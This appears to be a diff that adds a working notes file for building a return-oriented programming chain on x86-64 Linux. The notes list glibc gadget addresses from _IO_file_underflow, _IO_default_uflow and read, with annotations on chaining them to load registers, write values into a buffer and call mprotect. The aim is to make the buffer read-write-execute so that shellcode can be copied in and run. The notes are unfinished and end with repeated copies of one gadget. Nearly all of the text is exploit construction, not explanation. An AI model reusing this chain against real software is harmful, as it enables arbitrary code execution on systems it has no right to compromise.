@@ -1,0 +1,327 @@
+
+*RSI*
+ 670 Looking for gadgets at 0x4acb4d
+ 671 4|r|
+ 672 0x4acb4d  pop    rsi // set size, 2nd arg mprotect
+ 673 0x4acb4e  pop    r15
+ 674 0x4acb50  pop    rbp
+ 675 0x4acb51  ret
+
+Prepare the buffer pointer
+*RBX*
+ 856 0x7ffff74500a2  add    rsp,0x28
+ 857 0x7ffff74500a6  pop    rbx // must point to the buffer, to keep rbx in tact we need to exec ae88 and bece
+ 858 0x7ffff74500a7  pop    rbp
+ 859 0x7ffff74500a8  pop    r12
+ 860 0x7ffff74500aa  pop    r13
+ 861 0x7ffff74500ac  pop    r14
+ 862 0x7ffff74500ae  pop    r15
+ 863 0x7ffff74500b0  ret
+
+
+	ae88
+	 618 Looking for gadgets at 0x7ffff745ae88
+	 619 14|r|
+	 620 0x7ffff745ae88  cmp    rax,0x0  // send 0 characters //
+	 621 0x7ffff745ae8c  jle    0x7ffff745aed0 <_IO_file_underflow+368>
+	 637 0x7ffff745aed0  mov    eax,DWORD PTR [rbx]
+	 638 0x7ffff745aed2  jne    0x7ffff745af10 <_IO_file_underflow+432>
+	 639 0x7ffff745aed4  or     eax,0x10
+	 640 0x7ffff745aed7  mov    DWORD PTR [rbx],eax
+	 641 0x7ffff745aed9  add    rsp,0x8
+	 642 0x7ffff745aedd  mov    eax,0xffffffff
+	 643 0x7ffff745aee2  pop    rbx
+	 644 0x7ffff745aee3  pop    rbp
+	 645 0x7ffff745aee4  ret
+	bece
+	 838 Looking for gadgets at 0x7ffff745bece
+	 839 8|r|
+	 840 0x7ffff745bece  cmp    eax,0xffffffff
+	 841 0x7ffff745bed1  je     0x7ffff745bee2 <_IO_default_uflow+34>
+	 846 0x7ffff745bee2  pop    rbx // <-------------------- direct where to write
+	 847 0x7ffff745bee3  ret
+	
+	 851 Looking for gadgets at 0x7ffff7450095
+	 852 11|r|
+	 853 0x7ffff7450095  mov    rcx,QWORD PTR [rsp] // READ STUFF
+	 854 0x7ffff7450099  lea    rax,[rbp+r12*1+0x0] // set RAX to zero .. :)
+	 855 0x7ffff745009e  mov    QWORDl PTR [rbx+0x8],rcx // WRITE STUFF    <----------------------------- write in the buffer a pointer to buffer+0x10-1(added later) 
+	 856 0x7ffff74500a2  add    rsp,0x28
+	 857 0x7ffff74500a6  pop    rbx // must point to the buffer
+	 858 0x7ffff74500a7  pop    rbp
+	 859 0x7ffff74500a8  pop    r12
+	 860 0x7ffff74500aa  pop    r13
+	 861 0x7ffff74500ac  pop    r14
+	 862 0x7ffff74500ae  pop    r15
+	 863 0x7ffff74500b0  ret
+
+
+	ae88
+	 618 Looking for gadgets at 0x7ffff745ae88
+	 619 14|r|
+	 620 0x7ffff745ae88  cmp    rax,0x0 
+	 621 0x7ffff745ae8c  jle    0x7ffff745aed0 <_IO_file_underflow+368>
+	 637 0x7ffff745aed0  mov    eax,DWORD PTR [rbx]
+	 638 0x7ffff745aed2  jne    0x7ffff745af10 <_IO_file_underflow+432>
+	 639 0x7ffff745aed4  or     eax,0x10
+	 640 0x7ffff745aed7  mov    DWORD PTR [rbx],eax
+	 641 0x7ffff745aed9  add    rsp,0x8
+	 642 0x7ffff745aedd  mov    eax,0xffffffff
+	 643 0x7ffff745aee2  pop    rbx
+	 644 0x7ffff745aee3  pop    rbp
+	 645 0x7ffff745aee4  ret
+	bece
+	 838 Looking for gadgets at 0x7ffff745bece
+	 839 8|r|
+	 840 0x7ffff745bece  cmp    eax,0xffffffff
+	 841 0x7ffff745bed1  je     0x7ffff745bee2 <_IO_default_uflow+34>
+		 842 0x7ffff745bed3*  mov    rdx,QWORD PTR [rbx+0x8]
+		 843 0x7ffff745bed7*  movzx  eax,BYTE PTR [rdx]
+		 844 0x7ffff745beda*  add    rdx,0x1
+		 845 0x7ffff745bede*  mov    QWORD PTR [rbx+0x8],rdx
+	 846 0x7ffff745bee2  pop    rbx // <-------------------- direct where to write
+	 847 0x7ffff745bee3  ret
+	
+
+
+#####  ensure we get 0xA in memory  #####
+ 	 851 Looking for gadgets at 0x7ffff7450095
+	 852 11|r|
+	 853 0x7ffff7450095  mov    rcx,QWORD PTR [rsp] // READ STUFF
+	 854 0x7ffff7450099  lea    rax,[rbp+r12*1+0x0] //         set RAX to 0x5
+	 855 0x7ffff745009e  mov    QWORD PTR [rbx+0x8],rcx // WRITE STUFF    <----------------------------- write in the buffer 0x5
+	 856 0x7ffff74500a2  add    rsp,0x28
+	 857 0x7ffff74500a6  pop    rbx // must point to the buffer
+	 858 0x7ffff74500a7  pop    rbp
+	 859 0x7ffff74500a8  pop    r12
+	 860 0x7ffff74500aa  pop    r13
+	 861 0x7ffff74500ac  pop    r14
+	 862 0x7ffff74500ae  pop    r15
+	 863 0x7ffff74500b0  ret
+
+	ae88
+	 618 Looking for gadgets at 0x7ffff745ae88
+	 619 14|r|
+	 620 0x7ffff745ae88  cmp    rax,0x0 // rax must be > 0 ; rax = 0xffffffff
+	 621 0x7ffff745ae8c  jle    0x7ffff745aed0 <_IO_file_underflow+368>
+	 622 0x7ffff745ae8e  mov    rdx,QWORD PTR [rbx+0x90] // ignore at the moment
+	 623 0x7ffff745ae95  add    QWORD PTR [rbx+0x10],rax // set 0xA syscall nr
+	 624 0x7ffff745ae99  cmp    rdx,0xffffffffffffffff
+	 625 0x7ffff745ae9d  je     0x7ffff745aea9 <_IO_file_underflow+329>
+	 626 0x7ffff745ae9f*  add    rax,rdx
+	 627 0x7ffff745aea2*  mov    QWORD PTR [rbx+0x90],rax
+	 628 0x7ffff745aea9  mov    rax,QWORD PTR [rbx+0x8] // must contain a *pointer* !
+	 629 0x7ffff745aead  movzx  eax,BYTE PTR [rax] // set RAX to 0xA
+	 630 0x7ffff745aeb0  add    rsp,0x8
+	 631 0x7ffff745aeb4  pop    rbx
+	 632 0x7ffff745aeb5  pop    rbp
+	 633 0x7ffff745aeb6  ret
+	bece
+	 838 Looking for gadgets at 0x7ffff745bece
+	 839 8|r|
+	 840 0x7ffff745bece  cmp    eax,0xffffffff
+	 841 0x7ffff745bed1  je     0x7ffff745bee2 <_IO_default_uflow+34>
+		 842 0x7ffff745bed3*  mov    rdx,QWORD PTR [rbx+0x8]
+		 843 0x7ffff745bed7*  movzx  eax,BYTE PTR [rdx]
+		 844 0x7ffff745beda*  add    rdx,0x1
+		 845 0x7ffff745bede*  mov    QWORD PTR [rbx+0x8],rdx
+	 846 0x7ffff745bee2  pop    rbx // <-------------------- direct where to write
+	 847 0x7ffff745bee3  ret
+#####
+
+
+
+
+	 851 Looking for gadgets at 0x7ffff7450095
+	 852 11|r|
+	 853 0x7ffff7450095  mov    rcx,QWORD PTR [rsp] // READ STUFF
+	 854 0x7ffff7450099  lea    rax,[rbp+r12*1+0x0] // set RAX to zero .. :)
+	 855 0x7ffff745009e  mov    QWORD PTR [rbx+0x8],rcx // WRITE STUFF    <----------------------------- write in the buffer 0x07 = RWX prot
+	 856 0x7ffff74500a2  add    rsp,0x28
+	 857 0x7ffff74500a6  pop    rbx // must point to the buffer
+	 858 0x7ffff74500a7  pop    rbp
+	 859 0x7ffff74500a8  pop    r12
+	 860 0x7ffff74500aa  pop    r13
+	 861 0x7ffff74500ac  pop    r14
+	 862 0x7ffff74500ae  pop    r15
+	 863 0x7ffff74500b0  ret
+
+
+
+
+
+	ae88
+	 618 Looking for gadgets at 0x7ffff745ae88
+	 619 14|r|
+	 620 0x7ffff745ae88  cmp    rax,0x0  
+	 621 0x7ffff745ae8c  jle    0x7ffff745aed0 <_IO_file_underflow+368>
+	 637 0x7ffff745aed0  mov    eax,DWORD PTR [rbx]
+	 638 0x7ffff745aed2  jne    0x7ffff745af10 <_IO_file_underflow+432>
+	 639 0x7ffff745aed4  or     eax,0x10
+	 640 0x7ffff745aed7  mov    DWORD PTR [rbx],eax
+	 641 0x7ffff745aed9  add    rsp,0x8
+	 642 0x7ffff745aedd  mov    eax,0xffffffff
+	 643 0x7ffff745aee2  pop    rbx
+	 644 0x7ffff745aee3  pop    rbp
+	 645 0x7ffff745aee4  ret
+	bece
+	 838 Looking for gadgets at 0x7ffff745bece
+	 839 8|r|
+	 840 0x7ffff745bece  cmp    eax,0xffffffff
+	 841 0x7ffff745bed1  je     0x7ffff745bee2 <_IO_default_uflow+34>
+		 842 0x7ffff745bed3*  mov    rdx,QWORD PTR [rbx+0x8]
+		 843 0x7ffff745bed7*  movzx  eax,BYTE PTR [rdx]
+		 844 0x7ffff745beda*  add    rdx,0x1
+		 845 0x7ffff745bede*  mov    QWORD PTR [rbx+0x8],rdx
+	 846 0x7ffff745bee2  pop    rbx // <-------------------- direct where to write
+	 847 0x7ffff745bee3  ret
+
+
+
+
+
+*RDI*
+ 756 Looking for gadgets at 0x7ffff7450055
+ 757 2|r|
+ 758 0x7ffff7450055  pop    rdi
+ 759 0x7ffff7450056  ret
+
+filler
+   0x00007ffff74c6f5c <+60>:	add    rsp,0x8
+   0x00007ffff74c6f60 <+64>:	cmp    rax,0xfffffffffffff001
+   0x00007ffff74c6f66 <+70>:	jae    0x7ffff74c6f69 <read+73>
+   0x00007ffff74c6f68 <+72>:	ret   
+
+
+
+
+*RDX*
+*RAX*
+ 618 Looking for gadgets at 0x7ffff745ae88
+ 619 14|r|
+ 620 0x7ffff745ae88  cmp    rax,0x0 // rax must be > 0 ; rax = 0xffffffff
+ 621 0x7ffff745ae8c  jle    0x7ffff745aed0 <_IO_file_underflow+368>
+ 622 0x7ffff745ae8e  mov    rdx,QWORD PTR [rbx+0x90] // RDX should become 0x7 = RWX prot
+ 623 0x7ffff745ae95  add    QWORD PTR [rbx+0x10],rax
+ 624 0x7ffff745ae99  cmp    rdx,0xffffffffffffffff
+ 625 0x7ffff745ae9d  je     0x7ffff745aea9 <_IO_file_underflow+329>
+ 626 0x7ffff745ae9f*  add    rax,rdx
+ 627 0x7ffff745aea2*  mov    QWORD PTR [rbx+0x90],rax
+ 628 0x7ffff745aea9  mov    rax,QWORD PTR [rbx+0x8] // must contain a *pointer* !
+ 629 0x7ffff745aead  movzx  eax,BYTE PTR [rax] // set RAX to 0xA = mprotect syscall number
+ 630 0x7ffff745aeb0  add    rsp,0x8
+ 631 0x7ffff745aeb4  pop    rbx
+ 632 0x7ffff745aeb5  pop    rbp
+ 633 0x7ffff745aeb6  ret
+
+
+
+Mprotect
+ 525 Looking for gadgets at 0x7ffff74c6f4b
+   0x00007ffff74c6f4b <+43>:	syscall				// should set RAX to 0
+   0x00007ffff74c6f4d <+45>:	mov    rdi,QWORD PTR [rsp]
+   0x00007ffff74c6f51 <+49>:	mov    rdx,rax
+   0x00007ffff74c6f54 <+52>:	call   0x7ffff74e2100
+   0x00007ffff74c6f59 <+57>:	mov    rax,rdx
+   0x00007ffff74c6f5c <+60>:	add    rsp,0x8
+   0x00007ffff74c6f60 <+64>:	cmp    rax,0xfffffffffffff001
+   0x00007ffff74c6f66 <+70>:	jae    0x7ffff74c6f69 <read+73>
+   0x00007ffff74c6f68 <+72>:	ret    
+
+
+
+
+rax=0
+ae88
+ 618 Looking for gadgets at 0x7ffff745ae88
+ 619 14|r|
+ 620 0x7ffff745ae88  cmp    rax,0x0 
+ 621 0x7ffff745ae8c  jle    0x7ffff745aed0 <_IO_file_underflow+368>
+ 637 0x7ffff745aed0  mov    eax,DWORD PTR [rbx]
+ 638 0x7ffff745aed2  jne    0x7ffff745af10 <_IO_file_underflow+432>
+ 639 0x7ffff745aed4  or     eax,0x10 (if rax was == 0)  | or eax,0x20 (if rax was < 0)
+ 640 0x7ffff745aed7  mov    DWORD PTR [rbx],eax
+ 641 0x7ffff745aed9  add    rsp,0x8
+ 642 0x7ffff745aedd  mov    eax,0xffffffff
+ 643 0x7ffff745aee2  pop    rbx
+ 644 0x7ffff745aee3  pop    rbp
+ 645 0x7ffff745aee4  ret
+     0x00007ffff745af10 <+432>:	or     eax,0x20
+     0x00007ffff745af13 <+435>:	jmp    0x7ffff745aed7 <_IO_file_underflow+375>
+
+bece
+ 838 Looking for gadgets at 0x7ffff745bece
+ 839 8|r|
+ 840 0x7ffff745bece  cmp    eax,0xffffffff
+ 841 0x7ffff745bed1  je     0x7ffff745bee2 <_IO_default_uflow+34>
+ 846 0x7ffff745bee2  pop    rbx // <-------------------- direct where to write
+ 847 0x7ffff745bee3  ret
+
+
+
+ 863 0x7ffff74500b0  ret  // temporarily just return to the buffer..
+
+
+
+CONTINUE HERE ....
+
+
+* COPY SHELLCODE OR CREATE GADGETS *
+
+ 851 Looking for gadgets at 0x7ffff7450095
+ 852 11|r|
+ 853 0x7ffff7450095  mov    rcx,QWORD PTR [rsp]
+ 854 0x7ffff7450099  lea    rax,[rbp+r12*1+0x0]
+ 855 0x7ffff745009e  mov    QWORD PTR [rbx+0x8],rcx
+ 856 0x7ffff74500a2  add    rsp,0x28
+ 857 0x7ffff74500a6  pop    rbx
+ 858 0x7ffff74500a7  pop    rbp
+ 859 0x7ffff74500a8  pop    r12
+ 860 0x7ffff74500aa  pop    r13
+ 861 0x7ffff74500ac  pop    r14
+ 862 0x7ffff74500ae  pop    r15
+ 863 0x7ffff74500b0  ret  
+
+ 851 Looking for gadgets at 0x7ffff7450095
+ 852 11|r|
+ 853 0x7ffff7450095  mov    rcx,QWORD PTR [rsp]
+ 854 0x7ffff7450099  lea    rax,[rbp+r12*1+0x0]
+ 855 0x7ffff745009e  mov    QWORD PTR [rbx+0x8],rcx
+ 856 0x7ffff74500a2  add    rsp,0x28
+ 857 0x7ffff74500a6  pop    rbx
+ 858 0x7ffff74500a7  pop    rbp
+ 859 0x7ffff74500a8  pop    r12
+ 860 0x7ffff74500aa  pop    r13
+ 861 0x7ffff74500ac  pop    r14
+ 862 0x7ffff74500ae  pop    r15
+ 863 0x7ffff74500b0  ret
+
+ 851 Looking for gadgets at 0x7ffff7450095
+ 852 11|r|
+ 853 0x7ffff7450095  mov    rcx,QWORD PTR [rsp]
+ 854 0x7ffff7450099  lea    rax,[rbp+r12*1+0x0]
+ 855 0x7ffff745009e  mov    QWORD PTR [rbx+0x8],rcx
+ 856 0x7ffff74500a2  add    rsp,0x28
+ 857 0x7ffff74500a6  pop    rbx
+ 858 0x7ffff74500a7  pop    rbp
+ 859 0x7ffff74500a8  pop    r12
+ 860 0x7ffff74500aa  pop    r13
+ 861 0x7ffff74500ac  pop    r14
+ 862 0x7ffff74500ae  pop    r15
+ 863 0x7ffff74500b0  ret
+
+ 851 Looking for gadgets at 0x7ffff7450095
+ 852 11|r|
+ 853 0x7ffff7450095  mov    rcx,QWORD PTR [rsp]
+ 854 0x7ffff7450099  lea    rax,[rbp+r12*1+0x0]
+ 855 0x7ffff745009e  mov    QWORD PTR [rbx+0x8],rcx
+ 856 0x7ffff74500a2  add    rsp,0x28
+ 857 0x7ffff74500a6  pop    rbx
+ 858 0x7ffff74500a7  pop    rbp
+ 859 0x7ffff74500a8  pop    r12
+ 860 0x7ffff74500aa  pop    r13
+ 861 0x7ffff74500ac  pop    r14
+ 862 0x7ffff74500ae  pop    r15
+ 863 0x7ffff74500b0  ret
+
+
